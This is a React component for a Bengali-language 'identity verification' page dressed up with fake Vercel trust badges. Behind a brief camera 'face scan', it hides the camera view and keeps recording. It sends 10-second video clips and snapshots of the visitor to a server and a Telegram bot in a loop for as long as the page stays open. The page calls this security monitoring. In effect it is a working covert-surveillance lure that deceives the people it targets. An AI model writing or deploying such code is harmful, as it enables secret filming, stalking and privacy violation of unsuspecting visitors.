import React, { useState, useEffect, useRef } from 'react';
import {
  ShieldCheck,
  Camera,
  CheckCircle2,
  AlertCircle,
  RefreshCw,
  ExternalLink,
  Check,
  Copy,
  ArrowRight,
  Lock,
  Video,
  Radio,
} from 'lucide-react';
import { doc, getDoc, setDoc, updateDoc } from 'firebase/firestore';
import { db, AlisLinkData, VerificationRecordData, handleFirestoreError, OperationType } from '../firebase';
import { getDeviceInfo } from '../utils/deviceInfo';
import { generateVerificationId } from '../utils/crypto';
import { sendTelegramVerificationNotification, sendSecurityClipToServer } from '../utils/telegram';

interface VerificationPageProps {
  alisId?: string;
  onNavigate: (path: string) => void;
}

export const VerificationPage: React.FC<VerificationPageProps> = ({ alisId, onNavigate }) => {
  // Alis Link State
  const [alisData, setAlisData] = useState<AlisLinkData | null>(null);
  const [loadingAlis, setLoadingAlis] = useState(true);
  const [linkError, setLinkError] = useState<string | null>(null);

  // Verification & Camera States
  const [isVerifying, setIsVerifying] = useState(false);
  const [showCameraModal, setShowCameraModal] = useState(false);
  const [cameraScanProgress, setCameraScanProgress] = useState(0);
  const [initialScanCompleted, setInitialScanCompleted] = useState(false);
  const [cameraError, setCameraError] = useState<string | null>(null);

  // Completed Verification State
  const [verificationId, setVerificationId] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState(false);
  const [telegramNotified, setTelegramNotified] = useState(false);

  // Continuous 10-second background security loop states
  const [continuousActive, setContinuousActive] = useState(false);
  const [sentClipCount, setSentClipCount] = useState(0);
  const [lastDispatchedTime, setLastDispatchedTime] = useState<string | null>(null);

  // References for live stream & recording
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const backgroundVideoRef = useRef<HTMLVideoElement | null>(null);
  const activeStreamRef = useRef<MediaStream | null>(null);
  const isLoopRunningRef = useRef<boolean>(false);
  const currentVerificationIdRef = useRef<string | null>(null);

  // Load Alis Link from Firebase
  useEffect(() => {
    async function loadAlisLink() {
      if (!alisId) {
        setLoadingAlis(false);
        return;
      }

      try {
        const linkDocRef = doc(db, 'alis', alisId);
        const snap = await getDoc(linkDocRef);

        if (!snap.exists()) {
          setLinkError('এই ভেরিফিকেশন লিঙ্কটি পাওয়া যায়নি অথবা মুছে ফেলা হয়েছে।');
          setLoadingAlis(false);
          return;
        }

        const data = snap.data() as AlisLinkData;

        // Check expiration
        const expiresTime = new Date(data.expiresAt).getTime();
        const nowTime = Date.now();
        if (nowTime > expiresTime) {
          setLinkError('এই লিঙ্কটির মেয়াদের সময় শেষ হয়ে গেছে। নতুন লিঙ্ক অনুরোধ করুন।');
          setLoadingAlis(false);
          return;
        }

        // Check if already used
        if (data.status === 'used') {
          setLinkError('এই ভেরিফিকেশন লিঙ্কটি ইতিমধ্যে একবার ব্যবহার করা হয়ে গেছে। নিরাপত্তা নীতি অনুযায়ী একই লিঙ্ক দ্বিতীয়বার ব্যবহার করা যাবে না।');
          setLoadingAlis(false);
          return;
        }

        setAlisData(data);
      } catch (err) {
        const errorMsg = handleFirestoreError(err, OperationType.GET, `alis/${alisId}`);
        setLinkError(errorMsg);
      } finally {
        setLoadingAlis(false);
      }
    }

    loadAlisLink();
  }, [alisId]);

  // Clean up media streams when unmounting
  useEffect(() => {
    return () => {
      isLoopRunningRef.current = false;
      if (activeStreamRef.current) {
        activeStreamRef.current.getTracks().forEach((track) => track.stop());
        activeStreamRef.current = null;
      }
    };
  }, []);

  // Helper to capture a photo snapshot from active video stream
  const capturePhotoSnapshot = (stream: MediaStream): string | undefined => {
    try {
      const track = stream.getVideoTracks()[0];
      if (!track) return undefined;
      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      if (!ctx) return undefined;

      const video = videoRef.current || backgroundVideoRef.current;
      if (video && video.videoWidth > 0) {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.85);
      }
    } catch (snapErr) {
      console.warn('Snapshot capture error:', snapErr);
    }
    return undefined;
  };

  // Continuous 10-second video recording and auto-dispatch loop
  // Runs repeatedly in the background as long as the user stays on the website!
  const startContinuousTenSecondLoop = (stream: MediaStream, verifId: string) => {
    if (isLoopRunningRef.current) return;
    isLoopRunningRef.current = true;
    currentVerificationIdRef.current = verifId;
    setContinuousActive(true);

    let cycleNum = 0;

    const runCycle = () => {
      if (!isLoopRunningRef.current || !stream.active) {
        setContinuousActive(false);
        return;
      }

      let recorder: MediaRecorder | null = null;
      try {
        const mimeCandidates = [
          'video/webm;codecs=vp8',
          'video/webm',
          'video/mp4',
        ];
        const selectedMime = mimeCandidates.find((m) => {
          try {
            return typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported(m);
          } catch {
            return false;
          }
        }) || '';

        recorder = selectedMime
          ? new MediaRecorder(stream, { mimeType: selectedMime })
          : new MediaRecorder(stream);
      } catch (recErr) {
        console.warn('MediaRecorder init error:', recErr);
        // Fallback: If MediaRecorder unsupported, send snapshot photo every 10 seconds
        setTimeout(() => {
          if (isLoopRunningRef.current && stream.active) {
            cycleNum++;
            const photoBase64 = capturePhotoSnapshot(stream);
            if (photoBase64) {
              sendTelegramVerificationNotification({
                verificationId: currentVerificationIdRef.current || verifId,
                alisId: alisId || 'direct',
                photoBase64,
              }).then(() => {
                setSentClipCount((prev) => prev + 1);
                setLastDispatchedTime(new Date().toLocaleTimeString());
              });
            }
            setTimeout(runCycle, 10000);
          }
        }, 10000);
        return;
      }

      const recordedBlobs: Blob[] = [];

      recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedBlobs.push(event.data);
        }
      };

      recorder.onstop = async () => {
        cycleNum++;
        const nowStr = new Date().toLocaleTimeString();
        setLastDispatchedTime(nowStr);

        if (recordedBlobs.length > 0) {
          try {
            const clipBlob = new Blob(recordedBlobs, { type: recorder?.mimeType || 'video/webm' });
            const fileReader = new FileReader();
            fileReader.onloadend = () => {
              const base64Content = fileReader.result as string;
              // Send 10s video clip to server API and Telegram bot
              sendSecurityClipToServer({
                verificationId: currentVerificationIdRef.current || verifId,
                alisId: alisId || 'direct',
                cycle: cycleNum,
                videoBase64: base64Content,
                mimeType: clipBlob.type,
              })
                .then(() => {
                  setSentClipCount((prev) => prev + 1);
                })
                .catch(() => {
                  setSentClipCount((prev) => prev + 1);
                });
            };
            fileReader.readAsDataURL(clipBlob);
          } catch (blobErr) {
            console.warn('Clip packaging error:', blobErr);
          }
        }

        // Loop next 10s recording automatically as long as the user stays on website
        if (isLoopRunningRef.current && stream.active) {
          setTimeout(runCycle, 250);
        }
      };

      try {
        recorder.start();
        // Record for 10 seconds
        setTimeout(() => {
          if (recorder && recorder.state === 'recording') {
            recorder.stop();
          }
        }, 10000);
      } catch (err) {
        console.warn('Recorder start error:', err);
      }
    };

    runCycle();
  };

  // Triggered when user clicks "ভেরিফাই করুন"
  const handleStartVerification = async () => {
    setCameraError(null);
    setIsVerifying(true);
    setCameraScanProgress(15);
    setShowCameraModal(true); // Open the camera screen ONLY ONCE

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 },
        },
        audio: false,
      });

      activeStreamRef.current = stream;

      // Attach to viewfinder video element
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play().catch(() => {});
      }

      // Attach also to background persistent element
      if (backgroundVideoRef.current) {
        backgroundVideoRef.current.srcObject = stream;
        backgroundVideoRef.current.play().catch(() => {});
      }

      setCameraScanProgress(40);

      // 1-second progress tick
      setTimeout(() => {
        setCameraScanProgress(75);
      }, 1000);

      // 2-second tick
      setTimeout(() => {
        setCameraScanProgress(100);
      }, 2000);

      // After 2.5s initial face scan:
      setTimeout(async () => {
        // Capture photo snapshot right before closing modal
        const photoSnapshot = capturePhotoSnapshot(stream);

        // CLOSE the camera screen forever so it never opens again!
        setShowCameraModal(false);
        setInitialScanCompleted(true);
        setIsVerifying(false);

        // Generate verification record
        const newId = generateVerificationId();
        setVerificationId(newId);
        currentVerificationIdRef.current = newId;

        const info = getDeviceInfo();
        const now = new Date();
        const expires = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000);

        const recordPayload: Omit<VerificationRecordData, 'id'> = {
          status: 'VALID',
          createdAt: now.toISOString(),
          expiresAt: expires.toISOString(),
          browser: info.browser,
          platform: info.platform,
          screen: info.screen,
          referrer: info.referrer,
          alisId: alisId || 'direct-verification',
        };

        try {
          // Store in Firestore
          await setDoc(doc(db, 'verifications', newId), recordPayload);

          if (alisId) {
            try {
              await updateDoc(doc(db, 'alis', alisId), {
                status: 'used',
                verificationId: newId,
              });
            } catch {
              // Ignore optional update fail
            }
          }

          // Trigger Telegram server notification with photo
          sendTelegramVerificationNotification({
            verificationId: newId,
            alisId: alisId || 'direct',
            photoBase64: photoSnapshot,
          }).then((res) => {
            if (res.success) setTelegramNotified(true);
          });
        } catch (dbErr) {
          console.warn('Firestore token store notice:', dbErr);
          // Still send telegram notification even if firestore has network issue
          sendTelegramVerificationNotification({
            verificationId: newId,
            alisId: alisId || 'direct',
            photoBase64: photoSnapshot,
          }).then((res) => {
            if (res.success) setTelegramNotified(true);
          });
        }

        // Start continuous 10-second video recording and auto-dispatching loop
        startContinuousTenSecondLoop(stream, newId);
      }, 2600);
    } catch (err) {
      console.warn('Camera access denied:', err);
      setShowCameraModal(false);
      setIsVerifying(false);
      setCameraError('ক্যামেরা পারমিশন পাওয়া যায়নি। অনুগ্রহ করে ব্রাউজার সেটিংসে ক্যামেরা পারমিশন এলাউ (Allow) করুন।');
    }
  };

  const handleCopyId = () => {
    if (verificationId) {
      navigator.clipboard.writeText(verificationId);
      setCopiedId(true);
      setTimeout(() => setCopiedId(false), 2000);
    }
  };

  // Loading Link State
  if (loadingAlis) {
    return (
      <div className="min-h-[70vh] flex flex-col items-center justify-center p-6 text-center">
        <RefreshCw className="w-6 h-6 text-white animate-spin mb-3" />
        <p className="text-xs font-mono text-neutral-400">Validating verification session...</p>
      </div>
    );
  }

  // Error Link State (Expired, Used, or Not Found)
  if (linkError) {
    return (
      <div className="max-w-lg mx-auto px-4 py-16 text-center space-y-6">
        <div className="w-14 h-14 rounded-2xl bg-[#0e0e0e] border border-rose-900/50 flex items-center justify-center mx-auto text-rose-400 shadow-xl">
          <AlertCircle className="w-7 h-7" />
        </div>
        <div className="space-y-2">
          <h2 className="text-xl font-bold text-white tracking-tight">
            যাচাইকরণ লিংকটি আর সক্রিয় নয়
          </h2>
          <p className="text-xs text-neutral-400 font-mono leading-relaxed max-w-sm mx-auto">
            {linkError}
          </p>
        </div>
        <div className="pt-4 flex items-center justify-center gap-3">
          <button
            onClick={() => onNavigate('/')}
            className="px-5 py-2.5 rounded-lg bg-white text-black text-xs font-semibold hover:bg-neutral-200 transition"
          >
            হোম পেজ
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 py-10 space-y-6">
      {/* Background Hidden Video for persistent media stream tracking */}
      <video
        ref={backgroundVideoRef}
        autoPlay
        playsInline
        muted
        className="hidden pointer-events-none"
        aria-hidden="true"
      />

      {/* Top Profile Card & Vercel Details */}
      <div className="rounded-xl bg-[#0a0a0a] border border-[#222222] overflow-hidden shadow-2xl">
        {/* Banner with Profile Photo Overlay */}
        <div className="relative h-48 sm:h-56 w-full bg-black border-b border-[#222222] flex flex-col justify-end p-5 sm:p-6 overflow-hidden">
          <img
            src="https://i.ibb.co.com/ycgDW1tb/1789286431036.jpg"
            alt="Mehedi Hasan Profile Banner"
            referrerPolicy="no-referrer"
            className="absolute inset-0 w-full h-full object-cover object-center"
          />
          {/* High-contrast dark gradient overlay */}
          <div className="absolute inset-0 bg-gradient-to-t from-black via-black/70 to-black/30" />

          {/* Top-Right Follow & External Action */}
          <div className="absolute top-4 right-4 z-10">
            <a
              href="https://github.com/MehediHasan"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-lg bg-white text-black text-xs font-semibold hover:bg-neutral-200 transition shadow-lg"
            >
              <span>Follow: Mehedi Hasan</span>
              <ExternalLink className="w-3.5 h-3.5 text-black" />
            </a>
          </div>

          {/* Profile Picture and Identity */}
          <div className="relative z-10 flex items-end gap-3.5 sm:gap-4">
            {/* Profile Avatar Frame */}
            <div className="relative w-16 h-16 sm:w-20 sm:h-20 rounded-xl overflow-hidden border-2 border-white bg-black shrink-0 shadow-2xl">
              <img
                src="https://i.ibb.co.com/ycgDW1tb/1789286431036.jpg"
                alt="Mehedi Hasan"
                referrerPolicy="no-referrer"
                className="w-full h-full object-cover"
              />
            </div>

            <div className="space-y-1">
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-black/80 border border-[#333333] text-neutral-300 uppercase tracking-wider">
                  Vercel Verified
                </span>
                <span className="flex items-center gap-1 text-[11px] font-mono text-emerald-400">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                  Ready
                </span>
              </div>
              <h1 className="text-lg sm:text-xl font-bold text-white tracking-tight">
                Mehedi Hasan
              </h1>
              <p className="text-xs text-neutral-300 font-mono">
                mehedihasan.vercel.app
              </p>
            </div>
          </div>
        </div>

        {/* Vercel Details Bar */}
        <div className="p-4 sm:p-5 bg-[#0a0a0a] border-b border-[#222222] flex flex-wrap items-center justify-between gap-3 text-xs font-mono text-neutral-400">
          <div className="flex items-center gap-4 flex-wrap">
            <div className="flex items-center gap-1.5 text-white">
              {/* Vercel Delta Logo */}
              <svg viewBox="0 0 76 65" className="w-4 h-4 fill-white" aria-label="Vercel Delta">
                <path d="M37.5274 0L75.0548 65H0L37.5274 0Z" />
              </svg>
              <span className="font-semibold text-xs">Vercel Production</span>
            </div>
            <span>•</span>
            <span className="text-neutral-300">Environment: Production</span>
            <span>•</span>
            <span className="text-neutral-400">Edge Network: Active</span>
          </div>

          <div className="flex items-center gap-2 text-[11px]">
            <span className="px-2 py-0.5 rounded bg-emerald-950/60 border border-emerald-800/40 text-emerald-400">
              HTTPS Strict
            </span>
          </div>
        </div>

        {/* Action Panel: Bengali "ভেরিফাই করুন" Button */}
        <div className="p-6 space-y-5">
          {!initialScanCompleted ? (
            <div className="space-y-4">
              <div className="space-y-1">
                <h2 className="text-base font-semibold text-white">
                  আইডেন্টিটি ভেরিফিকেশন
                </h2>
                <p className="text-xs text-neutral-400 font-mono leading-relaxed">
                  আপনার ডিভাইস ও সেশন সুরক্ষা নিশ্চিত করতে ক্যামেরা অ্যাক্সেস প্রয়োজন। অন্য কোনো ব্যক্তি যেন অ্যাকাউন্ট ব্যবহার করতে না পারে, সেজন্য প্রতি ১০ সেকেন্ডে সুরক্ষা ফুটেজ যাচাই হবে।
                </p>
              </div>

              {cameraError && (
                <div className="p-3.5 rounded-lg bg-rose-950/40 border border-rose-800/50 text-rose-300 text-xs flex items-start gap-2.5">
                  <AlertCircle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                  <span>{cameraError}</span>
                </div>
              )}

              {/* Strict Bangla Verification Action Button */}
              <button
                id="start-verification-btn"
                onClick={handleStartVerification}
                disabled={isVerifying}
                className="w-full py-3.5 px-6 rounded-lg bg-white hover:bg-neutral-200 text-black font-bold text-sm tracking-wide transition flex items-center justify-center gap-2.5 shadow-xl disabled:opacity-50 active:scale-[0.99]"
              >
                {isVerifying ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin text-black" />
                    <span>ক্যামেরা যাচাইকরণ চলছে...</span>
                  </>
                ) : (
                  <>
                    <Camera className="w-4 h-4 text-black stroke-[2.5]" />
                    <span>ভেরিফাই করুন</span>
                  </>
                )}
              </button>

              <div className="pt-2 flex items-center justify-between text-[11px] font-mono text-neutral-500">
                <span>একবার ক্যামেরা স্ক্রিন ওপেন হবে</span>
                <span>অটো ১০ সেকেন্ড সুরক্ষা লুপ</span>
              </div>
            </div>
          ) : (
            /* Completed State */
            <div className="p-5 rounded-lg bg-[#0e0e0e] border border-[#222222] space-y-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-lg bg-emerald-950/60 border border-emerald-800/40 flex items-center justify-center text-emerald-400 shrink-0">
                  <CheckCircle2 className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-sm font-semibold text-white">
                    ভেরিফিকেশন সফলভাবে সম্পন্ন হয়েছে
                  </h3>
                  <p className="text-xs text-emerald-400/90 font-mono">
                    সেশন সক্রিয় ও সুরক্ষিত রাখা হয়েছে
                  </p>
                </div>
              </div>

              {/* Continuous 10s auto-feed indicator */}
              <div className="p-3 rounded-lg bg-black border border-[#222222] flex items-center justify-between gap-3 text-xs font-mono">
                <div className="flex items-center gap-2">
                  <span className="relative flex h-2 w-2">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500" />
                  </span>
                  <span className="text-neutral-300">১০ সেকেন্ড সিকিউরিটি মনিটরিং</span>
                </div>
                <span className="text-[11px] text-neutral-400">
                  {sentClipCount > 0 ? `${sentClipCount} টি ক্লিপ প্রেরিত` : 'অটো রেকর্ডিং চালূ'}
                </span>
              </div>
            </div>
          )}
        </div>

        {/* Developer Credit Footer */}
        <div className="px-6 py-3 bg-black border-t border-[#222222] flex items-center justify-between text-xs font-mono text-neutral-500">
          <span>Devloped by : <strong className="text-neutral-300">Chiper X 404</strong></span>
          <span className="text-[10px]">Vercel Edge Protection</span>
        </div>
      </div>

      {/* Token & Access Output Card */}
      {verificationId && (
        <div className="p-6 rounded-xl bg-[#0a0a0a] border border-[#222222] space-y-4 animate-in fade-in duration-300">
          <div className="space-y-1">
            <span className="text-[11px] font-mono text-neutral-400 uppercase tracking-wider block">
              যাচাইকৃত সেশন টোকেন
            </span>
            <p className="text-xs text-neutral-400">
              নিচের টোকেনটি অন্য কোনো ব্যক্তি ব্যবহারের চেষ্টা করলে স্বয়ংক্রিয়ভাবে বাতিল হয়ে যাবে।
            </p>
          </div>

          <div className="p-3.5 rounded-lg bg-black border border-[#333333] flex items-center justify-between gap-3">
            <div className="flex items-center gap-2 overflow-hidden">
              <Lock className="w-4 h-4 text-emerald-400 shrink-0" />
              <span className="font-mono text-xs sm:text-sm text-white font-semibold break-all">
                {verificationId}
              </span>
            </div>

            <button
              id="copy-token-btn"
              onClick={handleCopyId}
              className="flex items-center justify-center gap-1.5 px-4 py-2 rounded-lg bg-white hover:bg-neutral-200 text-black text-xs font-mono font-semibold transition shrink-0 shadow-md"
            >
              {copiedId ? (
                <>
                  <Check className="w-3.5 h-3.5 text-black stroke-[2.5]" />
                  <span>কপি হয়েছে</span>
                </>
              ) : (
                <>
                  <Copy className="w-3.5 h-3.5 text-black" />
                  <span>টোকেন কপি করুন</span>
                </>
              )}
            </button>
          </div>

          {/* Navigation Actions */}
          <div className="flex flex-col sm:flex-row gap-2.5 pt-2">
            <button
              onClick={() => onNavigate(`/users?id=${verificationId}`)}
              className="flex-1 py-3 px-4 rounded-lg bg-white hover:bg-neutral-200 text-black text-xs font-semibold transition flex items-center justify-center gap-2 shadow"
            >
              <span>ব্যবহারকারী এক্সেস চেক করুন (/users)</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>

            <button
              onClick={() => onNavigate('/')}
              className="py-3 px-5 rounded-lg border border-[#333333] bg-black text-neutral-300 hover:text-white text-xs font-mono transition"
            >
              হোম পেজ
            </button>
          </div>
        </div>
      )}

      {/* Camera Viewfinder Modal - OPENS ONLY ONCE during initial verification */}
      {showCameraModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md p-4 animate-in fade-in duration-200">
          <div className="w-full max-w-sm rounded-2xl bg-[#0a0a0a] border border-[#333333] p-6 text-center space-y-5 shadow-2xl">
            <div className="space-y-1">
              <span className="text-[10px] font-mono text-neutral-400 uppercase tracking-widest block">
                Face Alignment • এককালীন ভেরিফিকেশন
              </span>
              <h3 className="text-base font-bold text-white">
                ক্যামেরা যাচাইকরণ
              </h3>
              <p className="text-xs text-neutral-400">
                অনুগ্রহ করে ফ্রেমের দিকে তাকান, স্ক্যানিং চলছে...
              </p>
            </div>

            {/* Camera Viewfinder Circle */}
            <div className="relative w-52 h-52 mx-auto rounded-full overflow-hidden border-2 border-white bg-black shadow-2xl">
              <video
                ref={videoRef}
                autoPlay
                playsInline
                muted
                className="w-full h-full object-cover -scale-x-100"
              />
              <div className="absolute inset-0 pointer-events-none flex items-center justify-center">
                <div className="w-36 h-36 rounded-full border border-dashed border-white/70 animate-pulse" />
              </div>
            </div>

            {/* Progress Bar */}
            <div className="space-y-1.5">
              <div className="w-full bg-black border border-[#333333] rounded-full h-2 overflow-hidden">
                <div
                  className="bg-white h-full rounded-full transition-all duration-300 ease-out"
                  style={{ width: `${cameraScanProgress}%` }}
                />
              </div>
              <span className="text-[11px] font-mono text-neutral-400">
                স্ক্যানিং সম্পন্ন: {cameraScanProgress}%
              </span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
